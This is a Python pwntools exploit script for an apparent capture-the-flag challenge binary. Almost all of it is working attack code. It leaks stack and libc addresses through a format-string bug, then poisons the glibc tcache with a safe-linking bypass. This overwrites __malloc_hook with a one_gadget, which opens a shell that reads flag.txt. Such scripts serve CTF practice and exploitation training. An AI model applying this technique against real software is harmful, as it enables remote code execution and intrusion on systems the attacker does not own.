from pwn import *

host = "localhost"
port = 1337

exe = ELF("./dist/chall_patched")
libc = ELF("./dist/libc.so")

context.binary = exe

def wait_menu():
    r.recvuntil(b"----- DEFUSER -----")

def send(data):
    r.sendlineafter(b"> ", data)

def alloc(slot, size, data, only_trigger_malloc = False):
    wait_menu()
    send(b"1")
    send(str(slot).encode())
    send(str(size).encode())

    if not only_trigger_malloc:
        send(data)

def edit(slot, data):
    wait_menu()
    send(b"2")
    send(str(slot).encode())
    send(data)

def free(slot):
    wait_menu()
    send(b"3")
    send(str(slot).encode())

def greet(name):
    wait_menu()
    send(b"4")
    send(name)
    greetings = r.recvline()
    return greetings.decode()

def leak_stack(offset1, offset2):
    fstr = f"%{offset1}$lx %{offset2}$lx"
    greetings = greet(fstr.encode())
    leak1, leak2 = greetings.split(" ")[-2:]

    return int(leak1, 16), int(leak2, 16)

def safe_linking(address, fd):
    return fd ^ address >> 12

r = remote(host, port)

# these offsets are found using gdb
slots_offset = 24
libc_addr_offset = slots_offset + 11 # __libc_start_main+242

# https://github.com/david942j/one_gadget
one_gadget = 0xdf54f

alloc(1, 128, b"A" * 126)

first_slot, libc_leak = leak_stack(slots_offset, libc_addr_offset)
log.info(f"slots @ {hex(first_slot)}")

libc.address = libc_leak - (libc.symbols["__libc_start_main"] + 242)

log.info(f"libc @ {hex(libc.address)}")
log.info(f"__malloc_hook @ {hex(libc.symbols['__malloc_hook'])}")

# fortunately for us, __malloc_hook is aligned so this is not triggered :)
if libc.symbols["__malloc_hook"] % 16 != 0:
    log.warn("__malloc_hook is not aligned, you must use another aligned address")
    exit(0)

alloc(2, 128, b"B" * 126)
free(2)
free(1)
edit(1, p64(safe_linking(first_slot, libc.symbols["__malloc_hook"]))) # put the address of __malloc_hook in the fd pointer of slot 1's freed chunk
alloc(3, 128, b"C" * 126) # return slot 1 chunk
alloc(4, 128, p64(libc.address + one_gadget)) # return a pointer to __malloc_hook instead of one to the slot 2 because we overwrote it, we write the one_gadget in here
alloc(5, 128, "osef :DD", only_trigger_malloc=True) # we trigger malloc to call the hook

r.sendline(b"cat flag.txt")
log.success(r.recvline().decode())